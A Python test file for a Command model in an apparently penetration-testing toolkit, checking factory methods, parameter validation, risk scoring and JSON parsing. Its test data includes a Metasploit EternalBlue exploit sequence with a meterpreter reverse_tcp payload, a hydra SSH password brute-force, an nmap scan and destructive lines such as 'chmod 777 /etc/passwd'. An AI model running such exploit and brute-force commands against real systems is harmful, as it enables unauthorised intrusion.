"""Tests for Command model."""


from wish_models.command_result.command import Command, CommandType, parse_command_from_string


class TestCommand:
    """Test Command class functionality."""

    def test_command_creation(self):
        """Test basic Command creation."""
        cmd = Command(
            command="echo hello",
            tool_type=CommandType.BASH,
            tool_parameters={"timeout": 30}
        )

        assert cmd.command == "echo hello"
        assert cmd.tool_type == CommandType.BASH
        assert cmd.tool_parameters["timeout"] == 30

    def test_create_bash_command(self):
        """Test bash command factory method."""
        cmd = Command.create_bash_command(
            "nmap -sS 10.10.10.40",
            timeout=600,
            category="network"
        )

        assert cmd.command == "nmap -sS 10.10.10.40"
        assert cmd.tool_type == CommandType.BASH
        assert cmd.tool_parameters["timeout"] == 600
        assert cmd.tool_parameters["category"] == "network"

    def test_create_msfconsole_command(self):
        """Test msfconsole command factory method."""
        cmd = Command.create_msfconsole_command(
            "use exploit/windows/smb/ms17_010_eternalblue",
            module="exploit/windows/smb/ms17_010_eternalblue",
            rhosts="10.10.10.40",
            lhost="10.10.14.1"
        )

        assert cmd.command == "use exploit/windows/smb/ms17_010_eternalblue"
        assert cmd.tool_type == CommandType.MSFCONSOLE
        assert cmd.tool_parameters["module"] == "exploit/windows/smb/ms17_010_eternalblue"
        assert cmd.tool_parameters["rhosts"] == "10.10.10.40"
        assert cmd.tool_parameters["lhost"] == "10.10.14.1"

    def test_create_msfconsole_resource_command(self):
        """Test msfconsole resource command factory method."""
        commands = [
            "use exploit/windows/smb/ms17_010_eternalblue",
            "set RHOSTS 10.10.10.40",
            "set LHOST 10.10.14.1",
            "exploit"
        ]

        cmd = Command.create_msfconsole_resource_command(
            commands=commands,
            resource_file="/tmp/test.rc"
        )

        assert cmd.tool_type == CommandType.MSFCONSOLE_RESOURCE
        assert cmd.tool_parameters["commands"] == commands
        assert cmd.tool_parameters["resource_file"] == "/tmp/test.rc"
        assert "cat << 'EOF' > /tmp/test.rc" in cmd.command
        assert "msfconsole -q -r /tmp/test.rc" in cmd.command

    def test_create_meterpreter_command(self):
        """Test meterpreter command factory method."""
        cmd = Command.create_meterpreter_command(
            "getuid",
            session_id="1"
        )

        assert cmd.command == "getuid"
        assert cmd.tool_type == CommandType.METERPRETER
        assert cmd.tool_parameters["session_id"] == "1"

    def test_create_python_command(self):
        """Test python command factory method."""
        cmd = Command.create_python_command(
            script_path="exploit.py",
            arguments=["--target", "10.10.10.40", "--port", "80"]
        )

        assert cmd.tool_type == CommandType.PYTHON
        assert cmd.tool_parameters["script_path"] == "exploit.py"
        assert cmd.tool_parameters["arguments"] == ["--target", "10.10.10.40", "--port", "80"]
        assert 'python3 exploit.py "--target" "10.10.10.40" "--port" "80"' == cmd.command

    def test_create_powershell_command(self):
        """Test PowerShell command factory method."""
        cmd = Command.create_powershell_command(
            "Get-Process",
            execution_policy="RemoteSigned"
        )

        assert cmd.command == "Get-Process"
        assert cmd.tool_type == CommandType.POWERSHELL
        assert cmd.tool_parameters["execution_policy"] == "RemoteSigned"

    def test_validate_tool_parameters_msfconsole_exploit(self):
        """Test validation for MSF exploit commands."""
        # Command with exploit but missing RHOSTS
        cmd = Command(
            command="use exploit/windows/smb/ms17_010_eternalblue",
            tool_type=CommandType.MSFCONSOLE,
            tool_parameters={}
        )

        errors = cmd.validate_tool_parameters()
        assert len(errors) == 1
        assert "RHOSTS parameter required" in errors[0]

    def test_validate_tool_parameters_msfconsole_reverse_payload(self):
        """Test validation for reverse payload commands."""
        cmd = Command(
            command="set payload windows/meterpreter/reverse_tcp",
            tool_type=CommandType.MSFCONSOLE,
            tool_parameters={}
        )

        errors = cmd.validate_tool_parameters()
        assert len(errors) == 1
        assert "LHOST parameter required" in errors[0]

    def test_validate_tool_parameters_msfconsole_resource(self):
        """Test validation for MSF resource commands."""
        cmd = Command(
            command="msfconsole -q -r /tmp/exploit.rc",
            tool_type=CommandType.MSFCONSOLE_RESOURCE,
            tool_parameters={}
        )

        errors = cmd.validate_tool_parameters()
        assert len(errors) == 1
        assert "Commands list required" in errors[0]

    def test_validate_tool_parameters_python(self):
        """Test validation for Python commands."""
        cmd = Command(
            command="python3 exploit.py",
            tool_type=CommandType.PYTHON,
            tool_parameters={}
        )

        errors = cmd.validate_tool_parameters()
        assert len(errors) == 1
        assert "Script path required" in errors[0]

    def test_is_valid_property(self):
        """Test is_valid property."""
        # Valid bash command
        cmd = Command.create_bash_command("ls -la")
        assert cmd.is_valid

        # Invalid MSF command (missing RHOSTS)
        cmd = Command(
            command="use exploit/windows/smb/ms17_010_eternalblue",
            tool_type=CommandType.MSFCONSOLE,
            tool_parameters={}
        )
        assert not cmd.is_valid

    def test_get_execution_context(self):
        """Test execution context information."""
        cmd = Command.create_bash_command("nmap -sS 10.10.10.40")
        context = cmd.get_execution_context()

        assert context["tool_type"] == "bash"
        assert "requires_privileges" in context
        assert "estimated_duration" in context
        assert "risk_level" in context
        assert "dependencies" in context
        assert "nmap" in context["dependencies"]

    def test_requires_privileges(self):
        """Test privilege requirement detection."""
        # Privileged command
        cmd = Command.create_bash_command("sudo systemctl restart nginx")
        assert cmd._requires_privileges()

        # Non-privileged command
        cmd = Command.create_bash_command("ls -la")
        assert not cmd._requires_privileges()

        # MSF exploit command (privileged)
        cmd = Command.create_msfconsole_command("exploit")
        assert cmd._requires_privileges()

    def test_estimate_duration(self):
        """Test duration estimation."""
        # nmap command
        cmd = Command.create_bash_command("nmap -sS 10.10.10.40")
        assert cmd._estimate_duration() == 180

        # hydra command
        cmd = Command.create_bash_command("hydra -l admin -P passwords.txt ssh://10.10.10.40")
        assert cmd._estimate_duration() == 1800

        # MSF command
        cmd = Command.create_msfconsole_command("exploit")
        assert cmd._estimate_duration() == 60

    def test_assess_risk_level(self):
        """Test risk level assessment."""
        # High risk command
        cmd = Command.create_bash_command("rm -rf /tmp/test")
        assert cmd._assess_risk_level() == "HIGH"

        # Medium risk command
        cmd = Command.create_bash_command("sudo chmod 777 /etc/passwd")
        assert cmd._assess_risk_level() == "MEDIUM"

        # Low risk command
        cmd = Command.create_bash_command("ls -la")
        assert cmd._assess_risk_level() == "LOW"

    def test_get_dependencies(self):
        """Test dependency detection."""
        # nmap command
        cmd = Command.create_bash_command("nmap -sS 10.10.10.40")
        deps = cmd._get_dependencies()
        assert "nmap" in deps

        # MSF command
        cmd = Command.create_msfconsole_command("exploit")
        deps = cmd._get_dependencies()
        assert "metasploit-framework" in deps

        # Python command
        cmd = Command.create_python_command("exploit.py")
        deps = cmd._get_dependencies()
        assert "python3" in deps

    def test_to_json_from_json(self):
        """Test JSON serialization/deserialization."""
        cmd = Command.create_bash_command(
            "nmap -sS 10.10.10.40",
            timeout=600,
            category="network"
        )

        json_str = cmd.to_json()
        cmd2 = Command.from_json(json_str)

        assert cmd.command == cmd2.command
        assert cmd.tool_type == cmd2.tool_type
        assert cmd.tool_parameters == cmd2.tool_parameters

    def test_parse_command_from_string_plain(self):
        """Test parsing plain command string."""
        cmd = parse_command_from_string("ls -la")

        assert cmd.command == "ls -la"
        assert cmd.tool_type == CommandType.BASH

    def test_parse_command_from_string_json(self):
        """Test parsing JSON command string."""
        json_str = '{"command": "nmap -sS 10.10.10.40", "tool_type": "bash", "tool_parameters": {"timeout": 600}}'
        cmd = parse_command_from_string(json_str)

        assert cmd.command == "nmap -sS 10.10.10.40"
        assert cmd.tool_type == CommandType.BASH
        assert cmd.tool_parameters["timeout"] == 600


class TestCommandType:
    """Test CommandType enum."""

    def test_command_type_values(self):
        """Test all CommandType enum values."""
        assert CommandType.BASH.value == "bash"
        assert CommandType.MSFCONSOLE.value == "msfconsole"
        assert CommandType.MSFCONSOLE_RESOURCE.value == "msfconsole_resource"
        assert CommandType.METERPRETER.value == "meterpreter"
        assert CommandType.PYTHON.value == "python"
        assert CommandType.POWERSHELL.value == "powershell"

    def test_command_type_membership(self):
        """Test CommandType enum membership."""
        assert CommandType.BASH in CommandType
        assert CommandType.MSFCONSOLE in CommandType
        assert CommandType.MSFCONSOLE_RESOURCE in CommandType
        assert CommandType.METERPRETER in CommandType
        assert CommandType.PYTHON in CommandType
        assert CommandType.POWERSHELL in CommandType
